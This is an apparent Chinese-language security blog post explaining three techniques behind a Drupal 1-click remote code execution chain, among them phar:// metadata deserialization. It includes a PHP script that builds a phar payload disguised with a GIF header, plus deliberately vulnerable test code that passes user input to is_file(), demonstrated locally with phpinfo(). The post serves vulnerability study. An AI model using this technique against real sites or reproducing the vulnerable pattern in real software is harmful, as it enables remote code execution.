<!DOCTYPE html><html><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>Drupal 1-click to RCE漏洞利用的三个小技巧 | l4yn3</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/8.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">Drupal 1-click to RCE漏洞利用的三个小技巧</h1><a id="logo" href="/.">l4yn3</a><p class="description">努力前行</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Inicio</i></a><a href="/archives/"><i class="fa fa-archive"> Archivo</i></a><a href="/about/"><i class="fa fa-user"> Acerca de</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">Drupal 1-click to RCE漏洞利用的三个小技巧</h1><div class="post-meta">Apr 22, 2019</div><div class="post-content"><p>在<a href="https://paper.seebug.org" target="_blank" rel="noopener">Seebug</a>上看到的《<a href="https://paper.seebug.org/897/" target="_blank" rel="noopener">Drupal 1-click to RCE 分析</a>》这篇关于Drupal的漏洞分析，感觉很精彩，用到了三个很有意思的技巧点。</p>
<p>自己总结一下：</p>
<h3 id="1-preg-replace-u-模式下的-PREG-BAD-UTF8-ERROR"><a href="#1-preg-replace-u-模式下的-PREG-BAD-UTF8-ERROR" class="headerlink" title="1. preg_replace() /u 模式下的 PREG_BAD_UTF8_ERROR"></a>1. preg_replace() /u 模式下的 PREG_BAD_UTF8_ERROR</h3><p>PHP官网对于<code>/u</code>通配符的解释是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">u (PCRE_UTF8)</span><br><span class="line">此修正符打开一个与 perl 不兼容的附加功能。 模式和目标字符串都被认为是 utf-8 的。 无效的目标字符串会导致 preg_* 函数什么都匹配不到； 无效的模式字符串会导致 E_WARNING 级别的错误。 PHP 5.3.4 后，5字节和6字节的 UTF-8 字符序列被考虑为无效（resp. PCRE 7.3 2007-08-28）。 以前就被认为是无效的 UTF-8。</span><br></pre></td></tr></table></figure>
<p>就是说如果遇到非法的ut-8字符，会导致函数什么都匹配不到，最终返回null。</p>
<p>如果文件名中，如果出现了\x80到\xff的字符时，PHP就会抛出PREG_BAD_UTF8_ERROR。</p>
<p>测试代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$test = &quot;hello&quot;;</span><br><span class="line">$subject = &quot;Hello world&quot;.$_GET[&apos;a&apos;];</span><br><span class="line">$a = preg_replace(&quot;/\d/u&quot;, $test, $subject);</span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure>
<p>传递正常字符，页面返回正常：</p>
<p><img src="/uploads/drupal2.png" alt=""></p>
<p>当传递的参数为<code>a=%fe</code>，<code>$a</code>返回<code>null</code>。</p>
<p><img src="/uploads/drupal3.png" alt=""></p>
<h3 id="2-HTML-当中a标签可以设置打开文件的type"><a href="#2-HTML-当中a标签可以设置打开文件的type" class="headerlink" title="2. HTML 当中a标签可以设置打开文件的type"></a>2. HTML 当中a标签可以设置打开文件的type</h3><p>这个目前还没搞明白，因为测试的时候发现：除了IE会执行，其它的（Firefox和Chrome）都是提示下载。</p>
<h3 id="3-phar反序列化RCE"><a href="#3-phar反序列化RCE" class="headerlink" title="3. phar反序列化RCE"></a>3. phar反序列化RCE</h3><p>2018年BlackHat大会上的Sam Thomas分享的File Operation Induced Unserialization via the “phar://” Stream Wrapper议题，<a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf" target="_blank" rel="noopener">原文地址</a>。</p>
<p>提到PHP反序列化漏洞(PHP对象注入)，以前是如下思路：</p>
<ol>
<li>寻找<code>unserialize($param)</code>方法,溯源<code>$param</code>是否可控。</li>
<li>如果<code>$param</code>可控，再去寻找可以被注入的危险对象。</li>
<li>构造POP链，生成恶意反序列化字符串，实现代码注入，达到目的。</li>
</ol>
<p>明显条件[1]作为前提，如果条件[1]不成立，那么后面无法进行。</p>
<p>phar反序列化RCE 为[1]实现了另外一个入口。</p>
<p>《<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">利用 phar 拓展 php 反序列化漏洞攻击面</a>》这篇文章分析的很好。</p>
<p>phar 文件允许用户自定义<code>meta-data</code>文件头，而在phar文件内部，这个的存储恰好是序列化格式。</p>
<p><strong>php大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化</strong>。</p>
<p>测试一下：</p>
<p><a href="http://localhost/create.php" target="_blank" rel="noopener">http://localhost/create.php</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class DangerClass&#123;</span><br><span class="line"></span><br><span class="line">    public $_fn_close = &quot;phpinfo&quot;;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        call_user_func($this-&gt;_fn_close);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头，这里是为了后盖后缀名图片格式绕过</span><br><span class="line">$o = new DangerClass();</span><br><span class="line">$phar-&gt;setMetadata($o); //将自定义meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">//签名自动计算</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>用以上脚本生成恶意的phar文件,注意需要先修改php.ini 设置 <code>phar.readonly = Off</code>。因为安全问题，只能修改php.ini设置，在php脚本当中通过<code>ini_set()</code>直接设置不成立。</p>
<p>存在漏洞代码如下：</p>
<p><a href="http://localhost/test.php" target="_blank" rel="noopener">http://localhost/test.php</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class DangerClass&#123;</span><br><span class="line"></span><br><span class="line">    public $_fn_close = &quot;phpinfo&quot;;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        call_user_func($this-&gt;_fn_close);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;file&apos;]) &amp;&amp; is_file($_GET[&apos;file&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">	echo &quot;exists.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	echo &quot;No file.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>访问 <code>http://localhost/test.php?file=phar://phar.phar</code> 触发PHPinfo()。<br><img src="/uploads/drupal1.png" alt=""></p>
<p>以上反序列化漏洞的触发点是函数<code>is_file()</code>，其内部对phar文件的<code>meta-data</code>进行了反序列化，触发了漏洞。</p>
<p><strong>php大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化</strong>。</p>
<p>注：phar是php 5.3以后的功能。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://paper.seebug.org/897/" target="_blank" rel="noopener">Drupal 1-click to RCE 分析</a></p>
<p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">利用 phar 拓展 php 反序列化漏洞攻击面</a></p>
<p><a href="https://www.zerodayinitiative.com/blog/2019/4/11/a-series-of-unfortunate-images-drupal-1-click-to-rce-exploit-chain-detailed" target="_blank" rel="noopener">A SERIES OF UNFORTUNATE IMAGES: DRUPAL 1-CLICK TO RCE EXPLOIT CHAIN DETAILED</a></p>
</div><div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>l4yn3</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="/2019/04/22/Drupal-1-click-to-RCE漏洞利用的三个小技巧/">http://l4yn3.github.io/2019/04/22/Drupal-1-click-to-RCE漏洞利用的三个小技巧/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0 CN</a> 许可协议。转载请注明出处！</li></ul></div><br><div class="tags"></div><div class="post-nav"><a class="pre" href="/2019/04/27/hdwiki后台sql注入漏洞/">hdwiki后台sql注入漏洞</a><a class="next" href="/2019/04/20/Confluence-漏洞分析环境搭建/">Confluence 漏洞分析环境搭建</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="http://l4yn3.github.io"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Categorías</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/PHP安全/">PHP安全</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Etiquetas</i></div><div class="tagcloud"><a href="/tags/PHP代码审计/" style="font-size: 15px;">PHP代码审计</a> <a href="/tags/Java漏洞分析/" style="font-size: 15px;">Java漏洞分析</a> <a href="/tags/SQL注入-WEB安全/" style="font-size: 15px;">SQL注入 WEB安全</a> <a href="/tags/PHP安全/" style="font-size: 15px;">PHP安全</a> <a href="/tags/代码审计/" style="font-size: 15px;">代码审计</a> <a href="/tags/序列化漏洞/" style="font-size: 15px;">序列化漏洞</a> <a href="/tags/Wazuh-HIDS/" style="font-size: 15px;">Wazuh-HIDS</a> <a href="/tags/格式化安全问题/" style="font-size: 15px;">格式化安全问题</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recientes</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/05/03/YII框架全版本文件包含漏洞/">YII框架全版本文件包含漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/27/hdwiki后台sql注入漏洞/">hdwiki后台sql注入漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/22/Drupal-1-click-to-RCE漏洞利用的三个小技巧/">Drupal 1-click to RCE漏洞利用的三个小技巧</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/20/Confluence-漏洞分析环境搭建/">Confluence 漏洞分析环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/17/Codeigniter始终未完全修复的文件包含漏洞/">Codeigniter始终未完全修复的文件包含漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/05/PHP文件包含问题总结/">PHP安全漏洞所需条件总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/05/MySQL利用DNS实现注入总结/">MySQL利用DNS实现注入总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/05/Wazuh邮件报警配置总结/">Wazuh邮件报警配置总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/01/格式化字符串引发的安全问题/">格式化字符串引发的安全问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/01/PHP框架系统版本收集/">PHP框架系统版本收集</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Blogroll</i></div><ul></ul><a href="http://www.example1.com/" title="site-name1" target="_blank">site-name1</a><ul></ul><a href="http://www.example2.com/" title="site-name2" target="_blank">site-name2</a><ul></ul><a href="http://www.example3.com/" title="site-name3" target="_blank">site-name3</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2019 <a href="/." rel="nofollow">l4yn3.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>